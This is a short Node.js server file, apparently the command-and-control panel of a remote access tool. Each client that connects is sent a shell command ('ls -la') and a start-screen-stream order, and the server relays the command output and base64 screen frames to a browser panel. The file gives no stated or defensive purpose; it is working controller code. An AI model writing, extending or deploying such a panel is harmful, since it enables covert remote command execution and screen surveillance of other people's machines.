"use strict"

// --------------- INCLUDES ---------------
const express = require('express');
const app = express()
const http = require('http').Server(app);
const io = require('socket.io')(http);
const port = process.env.PORT || 3000;
const fs = require("fs")

// --------------- VARIABLES ---------------
let allClients = []
app.use("/", express.static(__dirname + "/panel"))

// --------------- SOCKIO CONNECTION ---------------
io.on('connection', (socket) => {
    let addedClient = false

    // --------------- CLIENT FUNCTIONS ---------------
    socket.on("add_client", (options) => {
        if (addedClient) return

        socket.clientData = Object.assign(options, {id: allClients.length})
        addedClient = true
        allClients.push(socket)

        socket.emit("command", {event: "start_stream"})
        socket.emit("command", {event: "cmd", command: "ls -la"})
    })

    socket.on("response", (data) => {
        console.log(data)
        socket.broadcast.emit("response", data)
    })

    socket.on("frame", (imageBuffer) => {
        socket.broadcast.emit("frame", imageBuffer.toString("base64"));
    })

    socket.emit("command", {event: "greet"})
});


// --------------- START SERVER ---------------
http.listen(port, () => {
    console.log(`Socket.IO server running at http://localhost:${port}/`);
});